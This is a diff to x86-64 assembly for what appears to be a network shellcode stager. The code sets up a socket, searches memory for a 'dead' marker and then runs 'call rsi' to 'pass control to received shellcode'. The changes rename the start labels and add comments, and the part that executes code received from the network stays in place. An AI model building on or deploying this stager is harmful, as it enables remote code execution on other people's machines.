@@ -12,11 +12,13 @@
 
 global _start
 
-     jmp short _start
+_start:
+
+     jmp short _realstart
     _start_code :
 		call rsi  ; pass control to received shellcode 
 
-_start:
+_realstart:
 
 
     ; sock = socket(AF_INET, SOCK_STREAM, 0)
@@ -139,11 +141,11 @@ _start:
       jnz Inc_rsi
       cmp [rsi - 8] , dword 0x64616564
       jnz Inc_rsi
-      jz _start_code
+      jz _start_code    
 
       Exit:
          push byte 0x3c
-         pop rax
+         pop rax                                         ; no matter for the exit code value 
          syscall
 
 
